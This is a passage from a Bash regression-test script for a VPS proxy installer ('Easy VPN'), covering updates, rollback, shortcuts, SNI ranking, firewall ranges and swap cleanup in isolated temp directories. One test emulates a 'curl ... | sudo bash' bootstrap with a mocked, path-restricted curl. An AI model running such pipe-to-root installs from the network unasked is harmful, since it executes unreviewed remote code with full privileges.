no_update_output=$(printf '0\n' | PATH="$update_test/mockbin:$PATH" MOCK_REMOTE_DIR="$update_test/same" \
    EASY_VPN_ROOT="$ROOT" EASY_VPN_ETC="$update_test/etc" EASY_VPN_STATE="$update_test/state" \
    EASY_VPN_BACKUPS="$update_test/backups" EASY_VPN_LOG="$update_test/log" \
    EASY_VPN_PROTOCOL_CATALOG_URL='https://mock.example/protocol_catalog.json' EASY_VPN_VERSION_URL='https://mock.example/VERSION' \
    bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; latest_singbox_version() { return 1; }; protocol_update_check' _ "$ROOT" 2>&1) || fail "no-update menu flow failed"
grep -q '2. 重装当前最新版' <<< "$no_update_output" || fail "reinstall prompt absent when up to date"
grep -q '未执行重装' <<< "$no_update_output" || fail "reinstall cancellation not respected"
update_cancel_output=$(printf '1\nN\n' | PATH="$update_test/mockbin:$PATH" MOCK_REMOTE_DIR="$update_test/new" \
    EASY_VPN_ROOT="$ROOT" EASY_VPN_ETC="$update_test/etc" EASY_VPN_STATE="$update_test/state" \
    EASY_VPN_BACKUPS="$update_test/backups" EASY_VPN_LOG="$update_test/log" \
    EASY_VPN_PROTOCOL_CATALOG_URL='https://mock.example/protocol_catalog.json' EASY_VPN_VERSION_URL='https://mock.example/VERSION' \
    bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; latest_singbox_version() { return 1; }; protocol_update_check' _ "$ROOT" 2>&1) || fail "update cancellation flow failed"
grep -q '1. 更新到最新版' <<< "$update_cancel_output" || fail "update prompt absent when update is available"
grep -q '已取消更新' <<< "$update_cancel_output" || fail "update cancellation not respected"
# Isolated resource summary smoke: avoid touching the host's /etc/easy-vpn.
summary_root=$(mktemp -d /tmp/easy-vpn-summary-test.XXXXXX)
summary=$(EASY_VPN_ROOT="$summary_root/root" EASY_VPN_ETC="$summary_root/etc" \
    EASY_VPN_STATE="$summary_root/state" EASY_VPN_BACKUPS="$summary_root/backups" EASY_VPN_LOG="$summary_root/log" \
    bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; show_easy_vpn_summary' _ "$ROOT" 2>&1) || fail "resource summary function execution"
grep -q 'VPS 概况' <<< "$summary" || fail "resource summary header"
grep -Eq '内存：总量 [0-9]' <<< "$summary" || fail "memory summary values"
grep -Eq '根分区：总容量 [0-9]' <<< "$summary" || fail "disk summary values"
grep -q '协议搭建' <<< "$summary" || fail "protocol description output"
! grep -q 'command not found' <<< "$summary" || fail "resource formatting helper missing"
rm -rf -- "$summary_root"

# Local installation path test in a disposable root; piped stdin with no controlling TTY must finish cleanly.
if [[ $EUID -eq 0 ]]; then
    isolated=$(mktemp -d /tmp/easy-vpn-install-test.XXXXXX)
    trap 'rm -rf -- "${isolated:-}"' EXIT
    mkdir -p "$isolated/mockbin" "$isolated/bin"
    PATH="$isolated/mockbin:$PATH" TERM=xterm EASY_VPN_TTY_DEVICE="$isolated/no-tty" EASY_VPN_ROOT="$isolated/root" EASY_VPN_ETC="$isolated/etc" EASY_VPN_SHORTCUT="$isolated/bin/vpn" EASY_VPN_LEGACY_SHORTCUT="$isolated/bin/easy-vpn" \
        bash "$ROOT/install.sh" </dev/null >"$isolated/install.log" 2>&1 || {
            cat "$isolated/install.log" >&2
            fail "local bundle installer / EOF exit"
        }
    [[ -x "$isolated/root/install.sh" ]] || fail "installer not copied"
    [[ -f "$isolated/root/modules/protocol.sh" ]] || fail "protocol module not copied"
    [[ ! -e "$isolated/root/modules/security.sh" && ! -e "$isolated/root/modules/apps.sh" && ! -e "$isolated/root/modules/optimize.sh" && ! -e "$isolated/root/modules/ip_test.sh" ]] || fail "unrelated modules installed"
    [[ -x "$isolated/bin/vpn" ]] || fail "vpn shortcut not installed"
    [[ -x "$isolated/bin/VPN" ]] || fail "uppercase VPN shortcut not installed"
    grep -Fq "$isolated/root/install.sh" "$isolated/bin/VPN" || fail "uppercase VPN shortcut points to wrong installer"
    grep -q '没有可交互终端' "$isolated/install.log" || fail "non-interactive install should explain how to open the menu"
    grep -q '打开菜单' "$isolated/install.log" && grep -q 'VPN' "$isolated/install.log" || fail "non-interactive install should tell user to run VPN"
    ! grep -q 'Easy VPN 协议搭建工具' "$isolated/install.log" || fail "installer should not call a menu with unreadable stdin"

    # With a controlling TTY but a piped/EOF stdin, the installer must reopen /dev/tty and show the menu.
    if command -v script >/dev/null 2>&1; then
        printf '0\n' | PATH="$isolated/mockbin:$PATH" TERM=xterm \
            EASY_VPN_ROOT="$isolated/root" EASY_VPN_ETC="$isolated/etc" \
            EASY_VPN_SHORTCUT="$isolated/bin/vpn" EASY_VPN_LEGACY_SHORTCUT="$isolated/bin/easy-vpn" \
            script -q -e -c "bash '$isolated/root/install.sh' </dev/null" "$isolated/tty-session.log" >/dev/null 2>&1 || {
                cat "$isolated/tty-session.log" >&2
                fail "piped stdin with controlling TTY did not complete interactive menu"
            }
        grep -q 'Easy VPN 协议搭建工具' "$isolated/tty-session.log" || fail "installer did not restore TTY for the menu"
        grep -q '0. 退出' "$isolated/tty-session.log" || fail "menu exit option was not shown on TTY"
        grep -q '下次可输入 VPN 快捷打开' "$isolated/tty-session.log" || fail "main-menu shortcut hint was not shown on TTY"
        grep -q '快捷启动：下次打开终端输入 VPN（或 vpn）' "$isolated/tty-session.log" || fail "summary shortcut hint was not shown on TTY"
    fi

    # Only remove the previous shortcut if it is our own wrapper pointing at this installation.
    printf '#!/usr/bin/env bash\nexec %q "$@"\n' "$isolated/root/install.sh" > "$isolated/bin/easy-vpn"
    chmod 755 "$isolated/bin/easy-vpn"
    PATH="$isolated/mockbin:$PATH" TERM=xterm EASY_VPN_TTY_DEVICE="$isolated/no-tty" EASY_VPN_ROOT="$isolated/root" EASY_VPN_ETC="$isolated/etc" EASY_VPN_SHORTCUT="$isolated/bin/vpn" EASY_VPN_LEGACY_SHORTCUT="$isolated/bin/easy-vpn" \
        bash "$isolated/root/install.sh" </dev/null >"$isolated/reinstall.log" 2>&1 || {
        cat "$isolated/reinstall.log" >&2
        fail "shortcut migration run"
    }
    [[ -x "$isolated/bin/vpn" ]] || fail "vpn shortcut lost after reinstall"
    [[ -x "$isolated/bin/VPN" ]] || fail "uppercase VPN shortcut lost after reinstall"
    [[ ! -e "$isolated/bin/easy-vpn" ]] || fail "legacy Easy VPN shortcut was not removed"

    # Verify an invalid-to-load module cannot replace the working installed bundle.
    bad_bundle="$isolated/bad-bundle"
    mkdir -p "$bad_bundle"
    cp -a "$ROOT/." "$bad_bundle/"
    printf '\nsource /this/path/does/not/exist/easy-vpn-test\n' >> "$bad_bundle/modules/protocol.sh"
    declare -a live_files=(install.sh VERSION lib/common.sh modules/protocol.sh protocol_catalog.json)
    declare -a before_hashes=()
    for rel in "${live_files[@]}"; do before_hashes+=("$(sha256sum "$isolated/root/$rel" | awk '{print $1}')"); done
    if PATH="$isolated/mockbin:$PATH" TERM=xterm EASY_VPN_TTY_DEVICE="$isolated/no-tty" EASY_VPN_ROOT="$isolated/root" EASY_VPN_ETC="$isolated/etc" EASY_VPN_SHORTCUT="$isolated/bin/vpn" EASY_VPN_LEGACY_SHORTCUT="$isolated/bin/easy-vpn" \
        bash "$bad_bundle/install.sh" </dev/null >"$isolated/rollback.log" 2>&1; then
        fail "bad module unexpectedly passed installed health check"
    fi
    for i in "${!live_files[@]}"; do
        after_hash=$(sha256sum "$isolated/root/${live_files[$i]}" | awk '{print $1}')
        [[ "$after_hash" == "${before_hashes[$i]}" ]] || fail "rollback did not restore ${live_files[$i]}"
    done
    grep -q '回滚完成' "$isolated/rollback.log" || { cat "$isolated/rollback.log" >&2; fail "rollback confirmation missing"; }

    # End-to-end bootstrap regression: emulate `curl ... | sudo bash`, where
    # BASH_SOURCE[0] is unset. Mock only the raw-file downloads; install into /tmp.
    pipe_isolated=$(mktemp -d /tmp/easy-vpn-piped-bootstrap.XXXXXX)
    mkdir -p "$pipe_isolated/mockbin"
    cat > "$pipe_isolated/mockbin/curl" <<'MOCK_RAW_CURL'
#!/usr/bin/env bash
set -Eeuo pipefail
out=""; url=""
while (($#)); do
    case "$1" in
        -o|--output) out="${2:-}"; shift 2 ;;
        http://*|https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done
[[ -n "$out" && "$url" == https://raw.githubusercontent.com/yesok6/easy-vpn/main/* ]] || {
    echo "unexpected mocked curl request" >&2; exit 1;
}
rel="${url#https://raw.githubusercontent.com/yesok6/easy-vpn/main/}"
rel="${rel%%\?*}"
case "$rel" in install.sh|VERSION|lib/common.sh|modules/protocol.sh|protocol_catalog.json) ;;
    *) echo "unexpected mocked path: $rel" >&2; exit 1 ;;
esac
cp -- "$MOCK_SOURCE_DIR/$rel" "$out"
MOCK_RAW_CURL
    chmod 755 "$pipe_isolated/mockbin/curl"
    if ! cat "$ROOT/install.sh" | PATH="$pipe_isolated/mockbin:$PATH" MOCK_SOURCE_DIR="$ROOT" TERM=xterm \
        EASY_VPN_TTY_DEVICE="$pipe_isolated/no-tty" \
        EASY_VPN_ROOT="$pipe_isolated/root" EASY_VPN_ETC="$pipe_isolated/etc" \
        EASY_VPN_SHORTCUT="$pipe_isolated/bin/vpn" EASY_VPN_LEGACY_SHORTCUT="$pipe_isolated/bin/easy-vpn" \
        bash >"$pipe_isolated/install.log" 2>&1; then
        cat "$pipe_isolated/install.log" >&2
        fail "piped stdin bootstrap installer failed"
    fi
    [[ -x "$pipe_isolated/root/install.sh" && -f "$pipe_isolated/root/modules/protocol.sh" ]] || {
        cat "$pipe_isolated/install.log" >&2
        fail "piped stdin bootstrap did not sync durable install files"
    }
    grep -q '没有可交互终端' "$pipe_isolated/install.log" || {
        cat "$pipe_isolated/install.log" >&2
        fail "piped stdin bootstrap did not finish gracefully without a TTY"
    }
    ! grep -q 'BASH_SOURCE\[0\]: unbound variable' "$pipe_isolated/install.log" || {
        cat "$pipe_isolated/install.log" >&2
        fail "piped stdin bootstrap still references unset BASH_SOURCE"
    }
fi

# 11. SNI candidate filtering and auto-ranking are deterministic without live network calls.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  grep -q "local mode=.*candidates=" "$1/modules/protocol.sh" || exit 101
  ! grep -Fq "dl.google.com" <(sed -n "/^get_best_sni()/,/^}/p" "$1/modules/protocol.sh") || exit 102
  validate_sni_hostname www.example.com || exit 103
  validate_sni_hostname api.apple.com || exit 104
  if validate_sni_hostname "-bad.example.com"; then exit 105; fi
  if validate_sni_hostname "bad..example.com"; then exit 106; fi
  if validate_sni_hostname "example.com:443"; then exit 107; fi
  if sni_candidate_domain_allowed example.com; then exit 108; fi
  if sni_candidate_domain_allowed 127.0.0.1; then exit 109; fi
  if sni_candidate_domain_allowed local.test; then exit 110; fi
  timing=$(sni_timing_components 0.040 0.080 0.110) || exit 116
  [[ "$timing" == "$(printf "40\t40\t30\t70")" ]] || exit 117
  if sni_timing_components 0.080 0.040 0.110 >/dev/null 2>&1; then exit 118; fi
  sni_probe_domain() {
    case "$1" in
      www.apple.com) printf "%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n" "$1" 90 10 40 50 3 > "$2" ;;
      addons.mozilla.org) printf "%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n" "$1" 70 5 25 40 3 > "$2" ;;
      www.icloud.com) printf "%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n" "$1" 10 1 2 8 2 > "$2" ;;
      *) return 1 ;;
    esac
  }
  selected=$(get_best_sni --auto 2>"$EASY_VPN_ROOT/sni-test.log") || exit 111
  [[ "$selected" == "addons.mozilla.org" ]] || exit 112
  grep -Fq "Prefer stability first" "$1/modules/protocol.sh" || exit 113
  grep -Fq "time_appconnect includes" "$1/modules/protocol.sh" || exit 114
  ! grep -Fq "回车使用自动建议" "$1/modules/protocol.sh" || exit 115
  grep -Fq "输入序号选择域名；输入 0 自动选择综合最佳项" "$1/modules/protocol.sh" || exit 119
' _ "$ROOT" || fail "SNI filtering/selection regression"

# 12. Protocol inbounds use an IPv4 wildcard when IPv6 is explicitly disabled.
listen_test="$regression_test/listen-address"
mkdir -p "$listen_test/proc/ipv6" "$listen_test/proc/net"
printf '1\n' > "$listen_test/disable_ipv6"
: > "$listen_test/if_inet6"
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  [[ "$(protocol_listen_address "$2/disable_ipv6" "$2/if_inet6")" == "0.0.0.0" ]] || exit 111
  printf "0\n" > "$2/disable_ipv6"
  [[ "$(protocol_listen_address "$2/disable_ipv6" "$2/if_inet6")" == "::" ]] || exit 112
  [[ $(grep -Fc "listen:\$listen" "$1/modules/protocol.sh") -eq 3 ]] || exit 113
  ! grep -Fq "listen:\"::\"" "$1/modules/protocol.sh" || exit 114
' _ "$ROOT" "$listen_test" || fail "IPv6-disabled listen-address fallback regression"

# 13. UFW port hopping uses a single native range rule and removes only that owned range.
ufw_range_test="$regression_test/ufw-range"
mkdir -p "$ufw_range_test/root" "$ufw_range_test/etc" "$ufw_range_test/state" "$ufw_range_test/backups"
EASY_VPN_ROOT="$ufw_range_test/root" EASY_VPN_ETC="$ufw_range_test/etc" \
EASY_VPN_STATE="$ufw_range_test/state" EASY_VPN_BACKUPS="$ufw_range_test/backups" EASY_VPN_LOG="$ufw_range_test/log" \
bash -c '
  source "$1/lib/common.sh"
  rules="$2/rules"; log="$2/log"
  firewall_backend() { echo ufw; }
  ufw() {
    printf "%s\\n" "$*" >> "$log"
    case "$1" in
      status) if [[ "${2:-}" == numbered ]]; then cat "$rules"; else printf "Status: active\\n"; cat "$rules"; fi ;;
      app) return 1 ;;
      allow) printf "[ 1] %s ALLOW IN Anywhere\\n[ 2] %s (v6) ALLOW IN Anywhere (v6)\\n" "${2#allow }" "${2#allow }" >> "$rules"; return 0 ;;
      --force) [[ "${2:-}" == delete && "${3:-}" == allow ]] || return 1; : > "$rules"; return 0 ;;
      *) return 1 ;;
    esac
  }
  : > "$rules"; : > "$log"
  manifest="$2/manifest"; : > "$manifest"
  EASY_VPN_FIREWALL_OWNER_MANIFEST="$manifest" firewall_allow_range 20000-20200 udp || exit 131
  [[ $(wc -l < "$manifest") -eq 1 ]] || exit 132
  grep -Fxq "ufw|20000-20200|udp" "$manifest" || exit 133
  grep -Fq "allow 20000:20200/udp" "$log" || exit 134
  [[ $(grep -Fc "allow 20000:20200/udp" "$log") -eq 1 ]] || exit 135
  firewall_remove_owned_range ufw 20000-20200 udp || exit 136
  grep -Fq -- "--force delete allow 20000:20200/udp" "$log" || exit 137
' _ "$ROOT" "$ufw_range_test" || fail "UFW range-based firewall ownership test failed"

# 14. The Reality prompt must advertise the currently valid low ports.
grep -Fq '允许 80、443 或 1024-65535' "$ROOT/modules/protocol.sh" || fail "Reality port prompt is stale"



# 15. protocol_diagnose must map inbound type values to the internal protocol names.
diagnose_test="$regression_test/diagnose"
mkdir -p "$diagnose_test/root" "$diagnose_test/etc/sing-box" "$diagnose_test/state" "$diagnose_test/backups"
cat > "$diagnose_test/etc/sing-box/config.json" <<'JSON'
{"inbounds":[{"tag":"vless-in","type":"vless","listen":"::","listen_port":443},{"tag":"hy2-in","type":"hysteria2","listen":"::","listen_port":8443},{"tag":"tuic-in","type":"tuic","listen":"::","listen_port":9443}]}
JSON
diagnose_output=$(EASY_VPN_ROOT="$diagnose_test/root" EASY_VPN_ETC="$diagnose_test/etc" EASY_VPN_CONF_DIR="$diagnose_test/etc/sing-box"     EASY_VPN_STATE="$diagnose_test/state" EASY_VPN_BACKUPS="$diagnose_test/backups" EASY_VPN_LOG="$diagnose_test/log"     bash -c '
      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
      resolve_singbox() { return 1; }
      protocol_listener_is_up() { [[ "$1" =~ ^(vless|hy2|tuic)$ ]]; }
      firewall_backend() { echo none; }
      protocol_diagnose
    ' _ "$ROOT" 2>&1) || fail "protocol diagnose execution failed"
grep -Fq 'tag=vless-in type=vless port=443 -> 已监听' <<< "$diagnose_output" || fail "VLESS diagnose status mapping wrong"
grep -Fq 'tag=hy2-in type=hysteria2 port=8443 -> 已监听' <<< "$diagnose_output" || fail "Hysteria diagnose status mapping wrong"
grep -Fq 'tag=tuic-in type=tuic port=9443 -> 已监听' <<< "$diagnose_output" || fail "TUIC diagnose status mapping wrong"

# 16. Clean-all must reconcile an orphaned hop restore unit even if no range state remains.
cleanup_test="$regression_test/orphan-hop-service"
mkdir -p "$cleanup_test/root/bin" "$cleanup_test/etc/port-hop" "$cleanup_test/state" "$cleanup_test/backups" "$cleanup_test/systemd/easy-vpn-sing-box.service.d" "$cleanup_test/etc/sing-box"
printf '#!/usr/bin/env bash\nexit 0\n' > "$cleanup_test/root/bin/easy-vpn-port-hop-restore"
chmod 755 "$cleanup_test/root/bin/easy-vpn-port-hop-restore"
printf '[Unit]\nDescription=Easy VPN port-hop restore\n' > "$cleanup_test/systemd/easy-vpn-port-hop.service"
printf '[Unit]\nWants=easy-vpn-port-hop.service\nAfter=easy-vpn-port-hop.service\n' > "$cleanup_test/systemd/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf"
EASY_VPN_ROOT="$cleanup_test/root" EASY_VPN_ETC="$cleanup_test/etc" EASY_VPN_STATE="$cleanup_test/state" EASY_VPN_BACKUPS="$cleanup_test/backups" EASY_VPN_LOG="$cleanup_test/log" EASY_VPN_SYSTEMD_DIR="$cleanup_test/systemd" bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  mark_owned "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore"
  mark_owned "$EASY_VPN_SYSTEMD_DIR/easy-vpn-port-hop.service"
  mark_owned "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf"
  systemctl() { return 0; }
  firewall_remove_owned_rules() { return 0; }
  restore_file_backup() { return 1; }
  remove_owned_service_user() { return 0; }
  uninstall_protocol_environment || exit 151
  [[ ! -e "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" ]] || exit 152
  [[ ! -e "$EASY_VPN_SYSTEMD_DIR/easy-vpn-port-hop.service" ]] || exit 153
  [[ ! -e "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" ]] || exit 154
' _ "$ROOT" || fail "orphan hop restore service cleanup regression"

# 17. A managed active swap is swapoff'd and removed before userdel; failures must block user deletion.
swap_test="$regression_test/swap-cleanup"
mkdir -p "$swap_test/root" "$swap_test/etc" "$swap_test/state" "$swap_test/backups"
EASY_VPN_ROOT="$swap_test/root" EASY_VPN_ETC="$swap_test/etc" EASY_VPN_STATE="$swap_test/state" EASY_VPN_BACKUPS="$swap_test/backups" EASY_VPN_LOG="$swap_test/log" EASY_VPN_SWAP_PATH="$swap_test/root/swapfile" SWAP_TEST_DIR="$swap_test" bash -c '
  source "$1/lib/common.sh"
  touch "$EASY_VPN_SWAP_PATH"
  mark_owned "$EASY_VPN_SWAP_PATH"
  state_set swap_created 1
  state_set swap_size_mb 256
  state_set service_user_owned 1
  state_set service_group_owned 0
  MOCK_SWAP_ACTIVE=1
  managed_swap_is_active() { [[ "$MOCK_SWAP_ACTIVE" == 1 ]]; }
  swapoff() { printf "%s\n" "$*" >> "$SWAP_TEST_DIR/swapoff.log"; MOCK_SWAP_ACTIVE=0; }
  remove_managed_swap_fstab_entry() { printf "%s\n" "$1" >> "$SWAP_TEST_DIR/fstab-clean.log"; }
  service_user_exists() { return 0; }
  service_group_exists() { return 1; }
  userdel() { printf "%s\n" "$*" >> "$SWAP_TEST_DIR/userdel.log"; return 0; }
  remove_owned_service_user || exit 161
  [[ ! -e "$EASY_VPN_SWAP_PATH" ]] || exit 162
  [[ ! -e "$EASY_VPN_STATE/swap_created" && ! -e "$EASY_VPN_STATE/swap_size_mb" ]] || exit 163
  [[ -s "$SWAP_TEST_DIR/swapoff.log" && -s "$SWAP_TEST_DIR/userdel.log" ]] || exit 164
  [[ ! -e "$EASY_VPN_STATE/service_user_owned" ]] || exit 165
' _ "$ROOT" || fail "managed active swap cleanup regression"

swap_fail_test="$regression_test/swap-cleanup-fail"
mkdir -p "$swap_fail_test/root" "$swap_fail_test/etc" "$swap_fail_test/state" "$swap_fail_test/backups"
EASY_VPN_ROOT="$swap_fail_test/root" EASY_VPN_ETC="$swap_fail_test/etc" EASY_VPN_STATE="$swap_fail_test/state" EASY_VPN_BACKUPS="$swap_fail_test/backups" EASY_VPN_LOG="$swap_fail_test/log" EASY_VPN_SWAP_PATH="$swap_fail_test/root/swapfile" SWAP_TEST_DIR="$swap_fail_test" bash -c '
  source "$1/lib/common.sh"
  touch "$EASY_VPN_SWAP_PATH"
  mark_owned "$EASY_VPN_SWAP_PATH"
  state_set swap_created 1
  state_set service_user_owned 1
  MOCK_SWAP_ACTIVE=1
  managed_swap_is_active() { [[ "$MOCK_SWAP_ACTIVE" == 1 ]]; }
  swapoff() { return 1; }
  remove_managed_swap_fstab_entry() { return 0; }
  service_user_exists() { return 0; }
  service_group_exists() { return 1; }
  userdel() { echo called >> "$SWAP_TEST_DIR/userdel.log"; return 0; }
  if remove_owned_service_user; then exit 171; fi
  [[ -f "$EASY_VPN_SWAP_PATH" && -f "$EASY_VPN_STATE/service_user_owned" ]] || exit 172
  [[ ! -e "$SWAP_TEST_DIR/userdel.log" ]] || exit 173
' _ "$ROOT" >"$swap_fail_test/output.log" 2>&1 || fail "swapoff failure did not safely block service-user deletion"
grep -q '无法停用 Easy VPN 管理的活动 Swap' "$swap_fail_test/output.log" || fail "swapoff failure message missing"

# 18. fstab cleanup removes only the exact managed swap entry.
fstab_test="$regression_test/fstab"
printf '# keep comment\nUUID=abc / ext4 defaults 0 1\n/var/lib/easy-vpn/swapfile none swap sw 0 0\n/swapfile none swap sw 0 0\n' > "$fstab_test"
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" bash -c 'source "$1/lib/common.sh"; remove_managed_swap_fstab_entry /var/lib/easy-vpn/swapfile "$2"' _ "$ROOT" "$fstab_test" || fail "managed fstab swap entry cleanup failed"
! grep -Fq '/var/lib/easy-vpn/swapfile none swap' "$fstab_test" || fail "managed swap entry remains in fstab"
grep -Fq 'UUID=abc / ext4 defaults 0 1' "$fstab_test" || fail "fstab cleanup removed root filesystem entry"
grep -Fq '/swapfile none swap sw 0 0' "$fstab_test" || fail "fstab cleanup removed unrelated user swap entry"

# 19. Update success must replace the current Bash process with the installed, refreshed entrypoint.
grep -Fq 'exec "${EASY_VPN_ROOT}/install.sh"' "$ROOT/modules/protocol.sh" || fail "successful update does not reload the new program"
grep -Fq '正在重新载入最新版菜单' "$ROOT/modules/protocol.sh" || fail "successful update reload message missing"

# 20. UDP port prompts were already accurate in 1.0.8; keep them aligned with validation.
[[ $(grep -Fc '允许 80、443 或 1024-65535' "$ROOT/modules/protocol.sh") -ge 2 ]] || fail "Hysteria/TUIC UDP port prompt became stale"

# 21. Successful online update replaces the current process with the installed refreshed entrypoint.
reload_test="$regression_test/update-reload"
mkdir -p "$reload_test/root" "$reload_test/etc" "$reload_test/state" "$reload_test/backups"
cp "$ROOT/VERSION" "$reload_test/root/VERSION"
cat > "$reload_test/root/install.sh" <<'STUB_INSTALL'
#!/usr/bin/env bash
if [[ "${1:-}" == "--update-return" ]]; then
  echo "MOCK_SYNC_SUCCEEDED"
  exit 0
fi
echo "NEW_ENTRYPOINT_REACHED"
STUB_INSTALL
chmod 755 "$reload_test/root/install.sh"
reload_output=$(printf '1\nY\n' | PATH="$update_test/mockbin:$PATH" MOCK_REMOTE_DIR="$update_test/new"     EASY_VPN_ROOT="$reload_test/root" EASY_VPN_ETC="$reload_test/etc" EASY_VPN_STATE="$reload_test/state"     EASY_VPN_BACKUPS="$reload_test/backups" EASY_VPN_LOG="$reload_test/log"     EASY_VPN_PROTOCOL_CATALOG_URL='https://mock.example/protocol_catalog.json' EASY_VPN_VERSION_URL='https://mock.example/VERSION'     bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; latest_singbox_version() { return 1; }; protocol_update_check' _ "$ROOT" 2>&1) || fail "successful update reload flow failed"
grep -q 'NEW_ENTRYPOINT_REACHED' <<< "$reload_output" || fail "updated menu entrypoint was not executed"
! grep -q '请重新运行.*vpn' <<< "$reload_output" || fail "update still asks the user to manually reload"
rm -rf -- "$update_test"

# 22. An orphaned persistence file must prevent destructive clean-all and keep the main service running.
orphan_guard="$regression_test/orphan-guard"
mkdir -p "$orphan_guard/root" "$orphan_guard/etc/port-hop" "$orphan_guard/etc/sing-box" "$orphan_guard/state" "$orphan_guard/backups" "$orphan_guard/systemd"
printf 'owned legacy persistence placeholder\n' > "$orphan_guard/etc/port-hop/hy2.iptables"
EASY_VPN_ROOT="$orphan_guard/root" EASY_VPN_ETC="$orphan_guard/etc" EASY_VPN_CONF_DIR="$orphan_guard/etc/sing-box" EASY_VPN_STATE="$orphan_guard/state" EASY_VPN_BACKUPS="$orphan_guard/backups" EASY_VPN_LOG="$orphan_guard/log" EASY_VPN_SYSTEMD_DIR="$orphan_guard/systemd" SYSTEMCTL_LOG="$orphan_guard/systemctl.log" bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  mark_owned "$EASY_VPN_ETC/port-hop/hy2.iptables"
  : > "$SYSTEMCTL_LOG"
  systemctl() { printf "%s\n" "$*" >> "$SYSTEMCTL_LOG"; return 0; }
  firewall_remove_owned_rules() { return 0; }
  restore_file_backup() { return 1; }
  remove_owned_service_user() { return 0; }
  if uninstall_protocol_environment; then exit 181; fi
  [[ -f "$EASY_VPN_ETC/port-hop/hy2.iptables" ]] || exit 182
  ! grep -Fq "stop easy-vpn-sing-box.service" "$SYSTEMCTL_LOG" || exit 183
' _ "$ROOT" >"$orphan_guard/output.log" 2>&1 || fail "orphan persistence guard test subprocess failed"
grep -q '未能关联到当前协议状态' "$orphan_guard/output.log" || fail "orphan persistence refusal message missing"

# 23. CLI pipeline arguments must be routed by install.sh before the interactive TTY gate.
grep -Fq 'dispatch_cli_command() {' "$ROOT/install.sh" || fail "installer entrypoint does not define CLI dispatcher"
grep -Fq 'deploy_vless_reality pipeline' "$ROOT/install.sh" || fail "pipeline-reality route does not call deploy function"
grep -Fq 'export EASY_VPN_PIPELINE=1' "$ROOT/install.sh" || fail "pipeline route does not set non-interactive mode"
grep -Fq 'export EASY_VPN_PIPELINE=1' "$ROOT/modules/protocol.sh" || fail "direct protocol pipeline route does not set non-interactive mode"
route_line=$(grep -nF 'if dispatch_cli_command "$@"; then' "$ROOT/install.sh" | head -n1 | cut -d: -f1)
tty_gate_line=$(grep -nF 'if [[ ! -t 0 ]]; then' "$ROOT/install.sh" | tail -n1 | cut -d: -f1)
[[ -n "$route_line" && -n "$tty_gate_line" && "$route_line" -lt "$tty_gate_line" ]] || fail "pipeline route runs after the non-TTY exit gate"
awk '/^dispatch_cli_command\(\) \{$/{capture=1} capture{print} capture && /^}$/{exit}' "$ROOT/install.sh" > "$regression_test/cli-dispatch-function.sh"
cli_dispatch_output=$(bash -c 'source "$1"; deploy_vless_reality(){ printf "PIPELINE=%s ARG=%s\n" "${EASY_VPN_PIPELINE:-}" "${1:-}"; }; dispatch_cli_command --pipeline-reality' _ "$regression_test/cli-dispatch-function.sh") || fail "CLI pipeline dispatcher failed"
grep -Fq 'PIPELINE=1 ARG=pipeline' <<< "$cli_dispatch_output" || fail "CLI pipeline dispatcher does not call deploy in non-interactive mode"

# 24. Shortcut installation creates a missing parent directory before using install(1).
grep -Fq 'mkdir -p -- "$shortcut_dir"' "$ROOT/install.sh" || fail "shortcut parent directory is not created"
awk '/^install_shortcut\(\) \{$/{capture=1} capture{print} capture && /^}$/ {exit}' "$ROOT/install.sh" > "$regression_test/shortcut-function.sh"
awk '/^install_uppercase_shortcut\(\) \{$/{capture=1} capture{print} capture && /^}$/ {exit}' "$ROOT/install.sh" >> "$regression_test/shortcut-function.sh"
shortcut_root="$regression_test/shortcut-parent-missing"
mkdir -p "$shortcut_root"
SHORTCUT="$shortcut_root/usr/local/bin/vpn" UPPERCASE_SHORTCUT="$shortcut_root/usr/local/bin/VPN" LOCAL_ROOT="$shortcut_root/installed" LEGACY_SHORTCUT="$shortcut_root/usr/local/bin/easy-vpn" LOG_DIR="$shortcut_root/etc" \
  bash -c 'source "$1"; install_shortcut; install_uppercase_shortcut; [[ -x "$SHORTCUT" && -x "$UPPERCASE_SHORTCUT" ]]; grep -Fq "$LOCAL_ROOT/install.sh" "$SHORTCUT"; grep -Fq "$LOCAL_ROOT/install.sh" "$UPPERCASE_SHORTCUT"' _ "$regression_test/shortcut-function.sh" \
  || fail "lowercase/uppercase shortcut install fails when parent directory does not exist"

# 25. IPv6 URI authorities must be bracketed, while saved host addresses stay unbracketed.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  [[ "$(normalize_server_address "2400:8902::1")" == "2400:8902::1" ]] || exit 1
